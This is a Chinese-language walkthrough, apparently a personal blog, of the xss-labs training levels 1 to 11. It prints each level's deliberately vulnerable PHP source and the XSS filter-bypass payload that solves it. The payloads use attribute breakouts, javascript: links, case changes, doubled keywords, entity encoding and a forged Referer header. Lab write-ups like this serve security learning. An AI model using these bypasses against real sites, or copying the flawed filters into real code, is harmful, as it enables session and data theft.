---
title: xss-labs
date: 2026-09-03 18:30:59
tags: 
  - web
  - xss
  - xss-labs
categories:
  - web 
  - xss	
  - xss-labs
---

# 一、什么是XSS

XSS，全称为跨站脚本攻击（Cross-Site Scripting），因为要和CSS区分开来，故称之为XSS。

XSS是指攻击者将恶意构造的脚本代码（比如恶意的JavaScript代码）注入到网页中，由于Web应用程序对用户输入**缺乏有效的过滤或转义**，导致这些数据被浏览器当作**可执行代码**解析并运行，从而窃取用户敏感信息、劫持会话或篡改页面内容。



# 二、反射型XSS

**反射型 XSS** （**非持久型跨站脚本攻击**）是指攻击者将恶意脚本作为参数附加在 URL 地址、表单提交或 HTTP 请求头中，**提交给服务端**。服务端接收到该请求后，**未对恶意参数进行任何过滤或转义**，直接将包含该恶意脚本的数据拼接进 HTML 响应页面中，并“反射”回给当前浏览器。浏览器在解析该响应页面时，由于无法区分这是“数据”还是“代码”，从而执行了攻击者注入的 JavaScript 脚本。

以xss-labs中的level1为例，先看level1.php中的代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
```

可以看到，`$str = $_GET["name"];`，`$str`接受来自GET传参的`name`值。当我们使用GET去传参`name`时，如果使`name=<script>alert(1)</script>`时，便会触发反射型xss，网页出现弹窗`1`。（具体的页面请看下面的level1的贴图）



# 三、存储型XSS



# 四、常见的标签利用及绕过

## htmlspecialchars

`htmlspecialchars` 是 PHP 里用来**把特殊字符转成 HTML 实体**的函数，主要目的是防止输出到 HTML 页面时被浏览器当成标签或脚本执行，从而避免 **XSS 跨站脚本攻击**。

主要转换以下几个字符：

```markdown
		字符	转换后
		&	&amp;
		"	&quot;
		'	&#039;
		<	&lt;
		>	&gt;
```

- **PHP 8.1 之前**：
  `htmlspecialchars($str)` 默认 flags 是 `ENT_COMPAT`，只转义双引号 `"`，**不转义单引号 `'`**。

  php

  ```
  echo htmlspecialchars("'");
  // 输出：'
  ```

- **PHP 8.1 及以后**：
  默认 flags 变成了 `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401`，这时**默认会转义单引号**。

  php

  ```
  echo htmlspecialchars("'");
  // 输出：&#039;
  ```

- **显式写 `ENT_QUOTES` 时**：
  不管哪个版本，单引号和双引号都会转义。

  php

  ```
  echo htmlspecialchars("'", ENT_QUOTES);
  // 输出：&#039;
  ```



# xss-labs

## level1

![image-20260903185623506](../images/image-20260903185623506.png)

当我们将url中的`name`改为`<script>alert(1)</script>`时，便触发了弹窗。由于xss-labs的前端代码会检测是否有弹窗，若有代码将会弹出`完成的不错！`字样，然后重定向到下一关。如下图

![image-20260903190009601](../images/image-20260903190009601.png)



## level2

首先来看源码

```php+html
1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level3.php?writing=wait"; 
     9	}
    10	</script>
    11	<title>欢迎来到level2</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level2</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    19	<form action=level2.php method=GET>
    20	<input name=keyword  value="'.$str.'">
    21	<input type=submit name=submit value="搜索"/>
    22	</form>
    23	</center>';
    24	?>
    25	<center><img src=level2.png></center>
    26	<?php 
    27	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
    28	?>
    29	</body>
    30	</html>

```

我们可以看到虽然`htmlspecialchars($str)`过滤了双引号`"`、尖括号`<`等字符（上面第四部分的`htmlspecialchars`有介绍），但是下面还存在一个`<input>`标签，其中`value="'.$str.'"`这个`$str`是未经过滤的。

那么可以考虑从这里来入手，来达到一个弹窗的效果

通过`keyword`去传入参数`" onclick="alert(1)`，便可实现弹窗

这里的payload是通过前一个双引号`"`闭合前面的`value="`，那`onclick="alert(1)`则是为了闭合`input`标签内后面的`">`，达到一个xss注入攻击的效果

那么`keyword`传入`payload`之后，第20行php代码就变成了

`<input name=keyword  value="" onclick="alert(1)">`



那么我们看一下实际操作：

![image-20260912110058271](../images/image-20260912110058271.png)

我们点击搜索后，再次点击对话框即可完成

![image-20260912110154998](./../images/image-20260912110154998.png)



## level3

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level4.php?keyword=try harder!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level3</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level3</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
    19	<form action=level3.php method=GET>
    20	<input name=keyword  value='".htmlspecialchars($str)."'>	
    21	<input type=submit name=submit value=搜索 />
    22	</form>
    23	</center>";
    24	?>
    25	<center><img src=level3.png></center>
    26	<?php 
    27	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
    28	?>
    29	</body>
    30	</html>
```

分析源码，可以看到18和20行处，都用了`htmlspecialchars`这个函数。由于我们这里的php版本是低于8.1的，所以这里是没有过滤`'`的。那么`payload`可以是`' onclick='alert(1)'`，如此便可实现xss注入。

![image-20260912112301219](./../images/image-20260912112301219.png)

![image-20260912112327205](./../images/image-20260912112327205.png)

但是如果我们要去考虑PHP8.1及之后的版本呢？还有没有其它手法？或者是寄希望于`htmlspecialchars`的`flags`参数的不恰当书写？

## level4

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level5.php?keyword=find a way out!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level4</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level4</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	$str2=str_replace(">","",$str);
    19	$str3=str_replace("<","",$str2);
    20	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    21	<form action=level4.php method=GET>
    22	<input name=keyword  value="'.$str3.'">
    23	<input type=submit name=submit value=搜索 />
    24	</form>
    25	</center>';
    26	?>
    27	<center><img src=level4.png></center>
    28	<?php 
    29	echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
    30	?>
    31	</body>
    32	</html>
```

看到源码中17、18、19行是对尖括号`<`和`>`进行了一个过滤，没有进行其它过滤，22行代码和之前没啥区别

尝试`payload=" onclick="alert(1)`，应该就可以顺利通过了

![image-20260912112851367](./../images/image-20260912112851367.png)

## level5

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level6.php?keyword=break it out!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level5</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level5</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = strtolower($_GET["keyword"]);
    18	$str2=str_replace("<script","<scr_ipt",$str);
    19	$str3=str_replace("on","o_n",$str2);
    20	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    21	<form action=level5.php method=GET>
    22	<input name=keyword  value="'.$str3.'">
    23	<input type=submit name=submit value=搜索 />
    24	</form>
    25	</center>';
    26	?>
    27	<center><img src=level5.png></center>
    28	<?php 
    29	echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
    30	?>
    31	</body>
    32	</html>
```

看到源码第17、18、19行，将`<script`、`on`等字符做了转换，那么想要使用`<script>alert(1)</script>`和`onclick=alert(1)`等就有了限制。

由于源码是没对尖括号`<`,`>`做限制，可以考虑`payload`：`"> <a href=javascript:alert(1)>1111</a> <"`

![image-20260915130152884](./../images/image-20260915130152884.png)

可以看到，此时这里的<u>`1111`</u>便是我们通过`<a>`构造出的，当我们点击<u>`1111`</u>时便会触发`alert(1)`。

![image-20260915130404316](./../images/image-20260915130404316.png)

## level6

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level7.php?keyword=move up!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level6</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level6</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	$str2=str_replace("<script","<scr_ipt",$str);
    19	$str3=str_replace("on","o_n",$str2);
    20	$str4=str_replace("src","sr_c",$str3);
    21	$str5=str_replace("data","da_ta",$str4);
    22	$str6=str_replace("href","hr_ef",$str5);
    23	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    24	<form action=level6.php method=GET>
    25	<input name=keyword  value="'.$str6.'">
    26	<input type=submit name=submit value=搜索 />
    27	</form>
    28	</center>';
    29	?>
    30	<center><img src=level6.png></center>
    31	<?php 
    32	echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
    33	?>
    34	</body>
    35	</html>
```

源码中将`<script`，`on`，`src`，`data`，`href`等进行了转换。与`level5.php`不同的是，`level6.php`中未对输入的字符进行小写转换，因此考虑字母大写绕过

`payload`有多种，尝试`"> <a Href=javascript:alert(1)>1111</a> <"`

![image-20260915131856246](./../images/image-20260915131856246.png)

![image-20260915131908369](./../images/image-20260915131908369.png)

## level7

当我们进行尝试时，发现`script`,`on`,`href`都被替换了，考虑尝试双写来绕过

![image-20260915132137195](./../images/image-20260915132137195.png)

`payload`可以尝试`" oonnclick="alert(1)`，像前面一样输入`payload`之后，点击搜索再点击输入框即可

![image-20260915132628403](./../images/image-20260915132628403.png)

### level7.php源码

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level8.php?keyword=nice try!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level7</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level7</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str =strtolower( $_GET["keyword"]);
    18	$str2=str_replace("script","",$str);
    19	$str3=str_replace("on","",$str2);
    20	$str4=str_replace("src","",$str3);
    21	$str5=str_replace("data","",$str4);
    22	$str6=str_replace("href","",$str5);
    23	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    24	<form action=level7.php method=GET>
    25	<input name=keyword  value="'.$str6.'">
    26	<input type=submit name=submit value=搜索 />
    27	</form>
    28	</center>';
    29	?>
    30	<center><img src=level7.png></center>
    31	<?php 
    32	echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
    33	?>
    34	</body>
    35	</html>
```

## level8

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level9.php?keyword=not bad!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level8</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level8</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = strtolower($_GET["keyword"]);
    18	$str2=str_replace("script","scr_ipt",$str);
    19	$str3=str_replace("on","o_n",$str2);
    20	$str4=str_replace("src","sr_c",$str3);
    21	$str5=str_replace("data","da_ta",$str4);
    22	$str6=str_replace("href","hr_ef",$str5);
    23	$str7=str_replace('"','&quot',$str6);
    24	echo '<center>
    25	<form action=level8.php method=GET>
    26	<input name=keyword  value="'.htmlspecialchars($str).'">
    27	<input type=submit name=submit value=添加友情链接 />
    28	</form>
    29	</center>';
    30	?>
    31	<?php
    32	 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
    33	?>
    34	<center><img src=level8.jpg></center>
    35	<?php 
    36	echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
    37	?>
    38	</body>
    39	</html>
```

由源码17-23行可知，源码对输入做了哪些限制

html实体编码在标签名/属性名里无效，但是在属性值里是可以被正常执行的，因此可以考虑利用html实体编码进行绕过。

`payload`为`javascr&#105;pt:alert(1)`，对字符`i`做了html实体编码

![image-20260915134056747](./../images/image-20260915134056747.png)

在点击添加友情链接后，点击友情链接，即可通过

## level9

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level10.php?keyword=well done!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level9</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level9</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = strtolower($_GET["keyword"]);
    18	$str2=str_replace("script","scr_ipt",$str);
    19	$str3=str_replace("on","o_n",$str2);
    20	$str4=str_replace("src","sr_c",$str3);
    21	$str5=str_replace("data","da_ta",$str4);
    22	$str6=str_replace("href","hr_ef",$str5);
    23	$str7=str_replace('"','&quot',$str6);
    24	echo '<center>
    25	<form action=level9.php method=GET>
    26	<input name=keyword  value="'.htmlspecialchars($str).'">
    27	<input type=submit name=submit value=添加友情链接 />
    28	</form>
    29	</center>';
    30	?>
    31	<?php
    32	if(false===strpos($str7,'http://'))
    33	{
    34	  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
    35	        }
    36	else
    37	{
    38	  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
    39	}
    40	?>
    41	<center><img src=level9.png></center>
    42	<?php 
    43	echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
    44	?>
    45	</body>
    46	</html>
```

看到第32行有个判断条件判断 `$str7` 这个字符串里是否不包含 `http://`，而且17 - 23行又分别做了字符替换过滤。

`payload`为`javascr&#105;pt:alert(1)//http://`

那这里的话，是利用`//`去注释掉这个`http://`,同时将`i`进行html实体编码，来让代码执行。

![image-20260915211929684](./../images/image-20260915211929684.png)

添加链接后，点击这个友情链接，即可通关

![image-20260915212011571](./../images/image-20260915212011571.png)

## level10

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level11.php?keyword=good job!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level10</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level10</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	$str11 = $_GET["t_sort"];
    19	$str22=str_replace(">","",$str11);
    20	$str33=str_replace("<","",$str22);
    21	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    22	<form id=search>
    23	<input name="t_link"  value="'.'" type="hidden">
    24	<input name="t_history"  value="'.'" type="hidden">
    25	<input name="t_sort"  value="'.$str33.'" type="hidden">
    26	</form>
    27	</center>';
    28	?>
    29	<center><img src=level10.png></center>
    30	<?php 
    31	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
    32	?>
    33	</body>
    34	</html>
```

看到源码，25行存在`$str33`注入点，17-20行是对输入的替换过滤限制。仔细看其实第17行的`keyword`应该是用不太到，下面一行的`t_sort`才是真正的点。

这里是只对尖括号`<`，`>`进行了限制，那么`on`一类的便可以使用了。

`payload `= `t_sort=" onclick=alert(1) type="text`，`type=text`可以让隐藏的输入框显现出来。

在url中键入`payload`后，点击输入框，即可通关

![image-20260915212822796](./../images/image-20260915212822796.png)

## level11

```php+HTML
     1	<!DOCTYPE html><!--STATUS OK--><html>
     2	<head>
     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
     4	<script>
     5	window.alert = function()  
     6	{     
     7	confirm("完成的不错！");
     8	 window.location.href="level12.php?keyword=good job!"; 
     9	}
    10	</script>
    11	<title>欢迎来到level11</title>
    12	</head>
    13	<body>
    14	<h1 align=center>欢迎来到level11</h1>
    15	<?php 
    16	ini_set("display_errors", 0);
    17	$str = $_GET["keyword"];
    18	$str00 = $_GET["t_sort"];
    19	$str11=$_SERVER['HTTP_REFERER'];
    20	$str22=str_replace(">","",$str11);
    21	$str33=str_replace("<","",$str22);
    22	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
    23	<form id=search>
    24	<input name="t_link"  value="'.'" type="hidden">
    25	<input name="t_history"  value="'.'" type="hidden">
    26	<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
    27	<input name="t_ref"  value="'.$str33.'" type="hidden">
    28	</form>
    29	</center>';
    30	?>
    31	<center><img src=level11.png></center>
    32	<?php 
    33	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
    34	?>
    35	</body>
    36	</html>
```

注入点在27行处，传入参数应该是通过`Referer`这个报文头来传，用`hackbar`，`Burpsuite`等一下都可以来做。

`Referer: " onclick=alert(1) type="text`

```http
GET /xss-labs/level11.php?keyword=111 HTTP/1.1
Host: 192.168.17.144
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: " onclick=alert(1) type="text
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

在`Burpsuite`上构造完后，`forward`一下，打开浏览器，点击一下出现的输入框

![image-20260915214942705](./../images/image-20260915214942705.png)

## level12



